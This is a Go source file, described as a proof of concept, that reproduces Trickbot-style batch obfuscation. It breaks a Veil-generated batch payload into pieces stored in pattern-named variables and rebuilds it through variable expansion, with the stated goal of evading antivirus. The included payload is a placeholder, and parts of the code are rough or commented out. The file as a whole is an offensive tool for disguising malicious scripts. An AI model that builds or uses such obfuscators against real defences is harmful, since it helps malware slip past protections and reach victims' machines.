package main

import (
	"fmt"
	"os"
	"strings"
)

// Overly simplified Trickbot obfuscation of rawFileOutPut - Veil batch payload that MAYBE evade AV
// Very PoC
// Made for and only for educational use
// Need to refactor out into seperate functions

type Payload struct {
	batchHeader             string
	trickbotHeader          string
	translatePayloadListing string
	obfuscatedPayload       string
	trickbotWhitespace      string
	trickbotSetWS           string
	trickbotEquals          string
}

func checkError(e error) {
	if e != nil {
		panic(e)
	}
}

func (p *Payload) ExportPayload(filepath string) error {
	f, err := os.Create(filepath)
	checkError(err)
	defer f.Close()
	_, err = f.WriteString(p.batchHeader)
	checkError(err)
	_, err = f.WriteString(p.trickbotHeader)
	checkError(err)
	_, err = f.WriteString(p.translatePayloadListing)
	checkError(err)
	_, err = f.WriteString(p.obfuscatedPayload)
	checkError(err)
	fmt.Println("Payload successfully written to %s", filepath)
	return nil
}

func initStrArray(n int) []string {
	result := make([]string, n)
	for i := 0; i <= n-1; i++ {
		result[i] = ""
	}
	return result
}

func (p *Payload) AssignDefaults() {
	p.batchHeader = "@echo off\n"
	p.trickbotHeader = "AAA=set\n%AAA% BBB= \n%AAA%%BBB%CCC==\n"
	p.trickbotWhitespace = "%BBB%"
	p.trickbotSetWS = "%AAA%%BBB"
	p.trickbotEquals = "%CCC%"
	p.translatePayloadListing = ""
	p.obfuscatedPayload = ""
	return
}

// Use MSFvenom-pattern_create to make pattern of X length
// Reformat to batch variable formatting
func MakeMSFvenomPattern(variableNameAnmount int) []string {
	builder := strings.Builder{}
	//variablePattern := os.exec("msfvenom-pattern_create", "-l %d", variableNameAnmount)
	variablePattern := "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6"
	patterns := strings.Split(variablePattern, "A")
	trickbotPayloadVariables := initStrArray(variableNameAnmount)
	// Format Pattern
	for i := 0; i <= variableNameAnmount-1; i++ {
		builder.WriteString("%A" + patterns[i] + "%")
		trickbotPayloadVariables[i] = builder.String()
		builder.Reset()
	}
	return trickbotPayloadVariables
}

// Write Variable assignment to translatePayloadListing
func (p *Payload) ConcatVarWithPayloadParts(trickbotPayloadVariables, splitPayload []string, variableNameAmount int) {
	builder := strings.Builder{}
	for i := 0; i <= variableNameAmount-1; i++ {
		builder.WriteString(p.trickbotSetWS + trickbotPayloadVariables[i] + p.trickbotEquals + splitPayload[i] + "\n")
	}
	builder.WriteString("\n")
	p.translatePayloadListing = builder.String()
	builder.Reset()
	return
}

// Write out the obfuscatedPayload payload eplacing payload with "variablized" whitespace
func (p *Payload) WriteObfuscatedPayload(trickbotPayloadVariables []string, variableNameAmount int) {
	builder := strings.Builder{}
	for i := 0; i <= variableNameAmount-1; i++ {
		builder.WriteString(trickbotPayloadVariables[i] + p.trickbotWhitespace)
	}
	builder.WriteString("\n")
	p.obfuscatedPayload = builder.String()
	builder.Reset()
	return
}

func main() {
	//builder := strings.Builder{}
	payload := Payload{}
	//outputFileName := "test"
	payload.AssignDefaults()

	//build.WriteString("/tmp/" + outputFileName)
	//filepath := builder.String()
	//builder.Reset()

	//CLI flag: filename in and out - just write to temp
	//rawFileOutput, err := os.ReadFile("/tmp/dat")
	//check(err)
	//Deal with the "@echo off"
	rawFileOutput := "@echo off\nZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ"
	splitHeaderAndPayload := strings.SplitN(rawFileOutput, "\n", 2)
	veilPayload := splitHeaderAndPayload[1]
	splitPayload := strings.SplitN(veilPayload, " ", -1)

	// Create Variable array to hold generate variable names
	variableNameAmount := len(splitPayload)

	trickbotPayloadVariables := MakeMSFvenomPattern(variableNameAmount)

	//Write Variable assignment to translatePayloadListing
	payload.ConcatVarWithPayloadParts(trickbotPayloadVariables, splitPayload, variableNameAmount)

	// Write out the obfuscatedPayload payload eplacing payload with "variablized" whitespace
	payload.WriteObfuscatedPayload(trickbotPayloadVariables, variableNameAmount)

	//Export payload to file
	//payload.ExportPayload()

	fmt.Println(payload.batchHeader)
	fmt.Println(payload.trickbotHeader)
	fmt.Println(payload.translatePayloadListing)
	fmt.Println(payload.obfuscatedPayload)

}

